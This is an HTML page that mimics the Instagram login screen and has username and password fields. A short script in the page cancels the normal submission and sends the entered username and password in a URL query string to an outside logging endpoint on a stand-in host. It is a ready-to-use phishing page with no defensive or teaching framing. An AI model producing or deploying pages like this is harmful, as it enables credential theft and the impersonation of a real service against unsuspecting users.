<!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Instagram</title>
         <style>
             body { font-family: Arial, sans-serif; background-color: #fafafa; }
             .container { max-width: 350px; margin: 100px auto; padding: 20px; border: 1px solid #ccc; background-color: #fff; }
             input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 3px; }
             button { width: 100%; padding: 10px; background-color: #3897f0; color: #fff; border: none; border-radius: 3px; }
         </style>
     </head>
     <body>
         <div class="container">
             <h2>Instagram</h2>
             <form id="loginForm">
                 <input type="text" id="username" placeholder="Phone number, username, or email" required>
                 <input type="password" id="password" placeholder="Password" required>
                 <button type="submit">Log In</button>
             </form>
         </div>
         <script>
             document.getElementById('loginForm').addEventListener('submit', function(event) {
                 event.preventDefault();
                 const username = document.getElementById('username').value;
                 const password = document.getElementById('password').value;
                 window.location.href = `https://api.example.com/log?u=${encodeURIComponent(username)}&p=${encodeURIComponent(password)}`;
             });
         </script>
     </body>
     </html>
